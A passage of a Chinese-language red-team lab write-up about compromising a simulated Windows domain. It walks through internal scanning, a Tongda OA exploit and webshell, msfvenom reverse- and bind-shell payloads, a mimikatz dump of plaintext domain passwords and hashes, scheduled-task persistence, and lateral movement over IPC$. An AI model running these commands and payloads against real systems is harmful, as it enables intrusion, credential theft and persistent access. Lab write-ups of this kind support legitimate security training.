src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714155117566.png" alt="image-20230714155117566"></p><p>好像还是不行，我们添加用户就以这台主机打吧</p><h2 id="上传fscan扫内网"><a class="markdownIt-Anchor" href="#上传fscan扫内网"></a> 上传fscan扫内网</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.52.1/24 -o result.txt</span><br><span class="line">./fscan_amd64 -h 192.168.93.1/24 -o 93fs.txt</span><br><span class="line">(icmp) Target 192.168.93.10   is alive</span><br><span class="line">(icmp) Target 192.168.93.20   is alive</span><br><span class="line">(icmp) Target 192.168.93.30   is alive</span><br><span class="line">(icmp) Target 192.168.93.40   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">192.168.93.30:139 open</span><br><span class="line">192.168.93.20:139 open</span><br><span class="line">192.168.93.40:135 open</span><br><span class="line">192.168.93.30:135 open</span><br><span class="line">192.168.93.20:135 open</span><br><span class="line">192.168.93.10:22 open</span><br><span class="line">192.168.93.40:445 open</span><br><span class="line">192.168.93.30:445 open</span><br><span class="line">192.168.93.20:445 open</span><br><span class="line">192.168.93.40:139 open</span><br><span class="line">192.168.93.20:8080 open</span><br><span class="line">192.168.93.10:8000 open</span><br><span class="line">192.168.93.30:88 open</span><br><span class="line">192.168.93.20:1099 open</span><br><span class="line">[*] alive ports len is: 14</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.93.30</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]192.168.93.30</span><br><span class="line">[*] NetBios: 192.168.93.30   [+]DC DC.whoamianony.org            Windows Server 2012 R2 Datacenter 9600 </span><br><span class="line">[+] 192.168.93.40       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[+] 192.168.93.30       MS17-010        (Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">[*] NetBios: 192.168.93.40   PC2.whoamianony.org                 Windows 7 Professional 7601 Service Pack 1 </span><br><span class="line">[+] 192.168.93.20       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://192.168.93.20:8080 code:200 len:10065  title:通达OA网络智能办公系统</span><br><span class="line">[+] InfoScan:http://192.168.93.20:8080 [通达OA] </span><br><span class="line">[+] http://192.168.93.20:8080 tongda-user-session-disclosure </span><br><span class="line">[*] WebTitle: http://192.168.93.10:8000 code:200 len:17474  title:Laravel</span><br></pre></td></tr></table></figure><p>有四台主机，其中，3台可以用ms17-010，能不能用成功是另外一回事了，先打通达OA那台主机</p><h1 id="pc-1"><a class="markdownIt-Anchor" href="#pc-1"></a> PC-1</h1><p>设置http代理后，我们可以访问网页：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721100733862.png" alt="image-20230721100733862"></p><p>先试试ms17-010吧，如果能打进去就好了。用proxychain代理另一个msf（虽然可以添加路由，但是session经常断，还是frp好用）</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721101735016.png" alt="image-20230721101735016"></p><p>不行，那就通达OA漏洞冲。</p><p>访问：<a target="_blank" rel="noopener" href="http://192.168.52.30:8080/ispirit/login_code.php">http://192.168.52.30:8080/ispirit/login_code.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;codeuid&quot;:&quot;&#123;F8C47480-79AC-099A-23E5-51593824A37E&#125;&quot;,&quot;authcode&quot;:&quot;LOGIN_CODEf792IO1xwD6Q4V7CHsuypdP2suN41iyt3d48vRzGFr04F8vjQO+gWBgQzVUeO0h0MXBPWDz3UwFDGcfEmFm8e2R\/uLGwlgDJen0kNggrKUGP0cCsh9PJzmS\/Qucx6rAzPniW\/vXiINWtGO1QGnj5r9J9cKsY&quot;&#125;</span><br></pre></td></tr></table></figure><p>访问：<a target="_blank" rel="noopener" href="http://192.168.52.30:8080//logincheck_code.php">http://192.168.52.30:8080//logincheck_code.php</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721104536431.png" alt="image-20230721104536431"></p><p>更改对应：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721105246123.png" alt="image-20230721105246123"></p><p>访问：<a target="_blank" rel="noopener" href="http://192.168.52.30:8080/general/index.php?isIE=0&amp;modify_pwd=0%EF%BC%8C%E5%A1%AB%E4%B8%8A%E5%AF%B9%E5%BA%94%E7%9A%84COOKIE%EF%BC%8C%E7%BB%95%E8%BF%87%EF%BC%9A">http://192.168.52.30:8080/general/index.php?isIE=0&amp;modify_pwd=0，填上对应的COOKIE，绕过：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: PHPSESSID=h1eha4jn67kshkshaq58m5f8k3; path=/</span><br></pre></td></tr></table></figure><p>失败了，emmmm，仔细看了一下：<strong>前台通过遍历UID找到在线的人员后，获取phpsession后即可登录</strong>，好把，我先登录～因为是遍历，难怪我弄不成功。</p><p>使用脚本：<a target="_blank" rel="noopener" href="https://github.com/z1un/TongdaOA-exp%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%A5%BDshell%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%B0%E8%9D%8E%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%BF%9E%E4%B8%8A">https://github.com/z1un/TongdaOA-exp，上传好shell，然后冰蝎设置代理连上</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721110846926.png" alt="image-20230721110846926"></p><p>然后上线msf，发现它能ping我们，也就是能连外网，冲</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111244409.png" alt="image-20230721111244409"></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111757397.png" alt="image-20230721111757397"></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721111822064.png" alt="image-20230721111822064"></p><p>下一步，信息搜集+提权+权限维持+横向移动</p><p>发现：php/meterpreter/reverse_tcp对于meterpreter的限制好大，没办法进入shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; route</span><br><span class="line">[-] The &quot;route&quot; command is not supported by this Meterpreter type (php/windows)</span><br></pre></td></tr></table></figure><p>赶紧上线一个exe吧，受不了了。上线成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">冰蝎上传：msfvenom -p windows/meterpreter/reverse_tcp lhost=10.131.210.172 lport=4706 -f exe -o 4706.exe</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721140617156.png" alt="image-20230721140617156"></p><h2 id="信息搜集-3"><a class="markdownIt-Anchor" href="#信息搜集-3"></a> 信息搜集</h2><p>checklist：</p><ul><li>权限</li><li>架构/系统类型/补丁</li><li>哈希/密码/配置信息</li><li>网络信息/配置/网卡</li><li>端口/服务</li></ul><p>上面说到了，有3个网卡，之前fscan也扫到：192.168.93.30是DC，40是PC2。因为已经是system权限，所以不考虑提权，还是可以看看有什么可以用的漏洞，利用<code>post/windows/gather/enum_patches</code>模块 可以根据漏洞编号快速找出系统中缺少的补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HotFix ID  Install Date</span><br><span class="line">---------  ------------</span><br><span class="line">KB2534111  8/25/2019</span><br><span class="line">KB2999226  9/15/2019</span><br><span class="line">KB958488   8/29/2019</span><br><span class="line">KB976902   11/21/2010</span><br></pre></td></tr></table></figure><p>哈希信息的话，用Kiwi（操作<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53087192/article/details/112707016">参考</a>）抓一下：发现kiwi的只是支持86的，好废物（原来是我的Payload设置错了，需要设置成x64的），还是自己下载传上去吧。<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe sekurlsa::logonpasswords</span><br><span class="line">Authentication Id : 0 ; 1591357 (00000000:0018483d)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/21 9:22:02</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * LM       : 56b0cd8b125c05055e2dd9e955f18034</span><br><span class="line">         * NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line">         * SHA1     : 2bc4124300a6a8fc0ca10891823d36c64e4b3a40</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : Whoami2021</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1243251 (00000000:0012f873)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : bunny</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/21 9:19:38</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-1112</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * LM       : 7de10bf327ef7f2ac6ebe8776a153feb</span><br><span class="line">         * NTLM     : cc567d5556030b7356ee4915ff098c8f</span><br><span class="line">         * SHA1     : 3747632756191e3350e53211c63f804eb163638f</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:10</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC1$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:10</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 3e6a3d8c713b4821eaa51aab25f52074</span><br><span class="line">         * SHA1     : d8e1318a24c64b8fcc89dc8609b09af50342bacf</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc1$</span><br><span class="line">         * Domain   : whoamianony.org</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 50236 (00000000:0000c43c)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:09</span><br><span class="line">SID               : </span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 3e6a3d8c713b4821eaa51aab25f52074</span><br><span class="line">         * SHA1     : d8e1318a24c64b8fcc89dc8609b09af50342bacf</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC1$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/21 9:19:09</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC1$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : pc1$</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : %Yn!@ZW,eWz5&gt;[!hh;H.(&amp;n(yh^2YADmU*2bVx&lt;N#yvw.9MTwmi;84&#x27;&#x27;uRaucL)mw7I42S&gt;sUE#r&amp;u]vz6\/:5A.s5nLrko+zfn@])/&quot;$V6?sDZel=f&gt;[ol;</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a class="markdownIt-Anchor" href="#权限维持"></a> 权限维持</h2><p>使用任务：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721141149902.png" alt="image-20230721141149902"></p><p>使用定时任务（<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677145/article/details/122061271">at / schtasks</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN sysRev2 /SC DAILY /ST 10:02 /TR C:\Windows\Temp\4706.exe /RL HIGHEST</span><br><span class="line"># 五分钟一次</span><br><span class="line">schtasks /create /sc minute /mo 5 /tn &quot;sysRev2&quot; /tr C:\Windows\Temp\4706.exe</span><br></pre></td></tr></table></figure><h2 id="横向"><a class="markdownIt-Anchor" href="#横向"></a> 横向</h2><p>因为尝试过对PC2和DC进行永恒之蓝攻击，没用，所以横向吧，哈哈哈哈。搜集到的信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Username : Administrator</span><br><span class="line">Domain   : WHOAMIANONY</span><br><span class="line">NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line">Password : Whoami2021</span><br><span class="line"></span><br><span class="line">#其他IP</span><br><span class="line">192.168.93.30 （DC）</span><br><span class="line">192.168.93.40</span><br><span class="line"></span><br><span class="line">#DNS</span><br><span class="line">whoamianony.org</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试ipc连接一下，这里竟然明文传递就可以了，行吧～</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.40\ipc$ &quot;Whoami2021&quot; /user:whoamianony.org\Administrator</span><br><span class="line">net use \\192.168.93.30\ipc$ &quot;Whoami2021&quot; /user:whoamianony.org\Administrator</span><br><span class="line"></span><br><span class="line">C:\Windows\Temp&gt;net use</span><br><span class="line">\192.168.93.30\ipc$      Microsoft Windows Network</span><br><span class="line">\\192.168.93.40\ipc$      Microsoft Windows Network</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721150954348.png" alt="image-20230721150954348"></p><p>成功了。然后传个frp进去，准备打DC（虽然可以直接拿下，但是还是模拟一下三层吧）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy frpc.exe \\192.168.93.40\admin$</span><br><span class="line">copy frpc2.ini \\192.168.93.40\admin$</span><br><span class="line">copy frp.bat \\192.168.93.40\admin$</span><br><span class="line"></span><br><span class="line">at \\192.168.93.40 15:51 frp.bat </span><br><span class="line">at \\192.168.93.40 17:06 PC2.exe</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721152615512.png" alt="image-20230721152615512"></p><p>传进去了，然后在我们的web2开启frps。添加proxychain</p><blockquote><p>具体的操作是，先搭好第一个隧道，然后默认配置移位到内网中，只是改一下frpc中的ip即可，其他都不用改</p></blockquote><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230721162737931.png" alt="image-20230721162737931"></p><p>可以看到，设置成功（虽然，其实，我们用不到，但不能没有！）</p><p>现在设置正向连接，传一个马进去，然后我们主机连他（因为它连不出来）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=4801 -f exe -o /home/j3fffff/Template/4801.exe</span><br><span class="line">copy 4801.bat \\192.168.93.40\admin$</span><br><span class="line">schtasks /Create /s 192.168.93.40 /TN sysRev2 /SC MINUTE /ST 11:05 /TR C:\Windows\4801.exe #用at或者impacket也行，后面有说道，运行后再加上服务也OK</span><br></pre></td></tr></table></figure><h1 id="pc2"><a class="markdownIt-Anchor" href="#pc2"></a> PC2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 PC2</span><br><span class="line">OS Name:                   Microsoft Windows 7 专业版 </span><br><span class="line">OS Version:                6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Member Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows 用户</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00371-177-0000061-85693</span><br><span class="line">Original Install Date:     2019/8/25, 9:54:10</span><br><span class="line">System Boot Time:          2023/7/26, 15:29:23</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware Virtual Platform</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 25 Model 116 Stepping 1 AuthenticAMD ~3792 Mhz</span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             zh-cn;Chinese (China)</span><br><span class="line">Input Locale:              zh-cn;Chinese (China)</span><br><span class="line">Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 1,267 MB</span><br><span class="line">Virtual Memory: Max Size:  4,095 MB</span><br><span class="line">Virtual Memory: Available: 3,236 MB</span><br><span class="line">Virtual Memory: In Use:    859 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    whoamianony.org</span><br><span class="line">Logon Server:              \\DC</span><br><span class="line">Hotfix(s):                 4 Hotfix(s) Installed.</span><br><span class="line">                           [01]: KB2534111</span><br><span class="line">                           [02]: KB2999226</span><br><span class="line">                           [03]: KB958488</span><br><span class="line">                           [04]: KB976902</span><br><span class="line">Network Card(s):           4 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: 本地连接</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 192.168.93.40</span><br><span class="line">                                 [02]: fe80::31c7:aebb:d3a:2483</span><br><span class="line">                           [02]: Bluetooth 设备(个人区域网)</span><br><span class="line">                                 Connection Name: Bluetooth 网络连接</span><br><span class="line">                                 Status:          Media disconnected</span><br><span class="line">                           [03]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: 本地连接 2</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     10.10.10.255</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.2</span><br><span class="line">                                 [02]: fe80::dc73:8b1c:8bf8:4e13</span><br><span class="line">                           [04]: Microsoft Loopback Adapter</span><br><span class="line">                                 Connection Name: Npcap Loopback Adapter</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     255.255.255.255</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 169.254.129.186</span><br><span class="line">                                 [02]: fe80::b461:ccad:e30f:81ba</span><br></pre></td></tr></table></figure><p>然而想要提权，烂土豆用不了，没有模拟权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 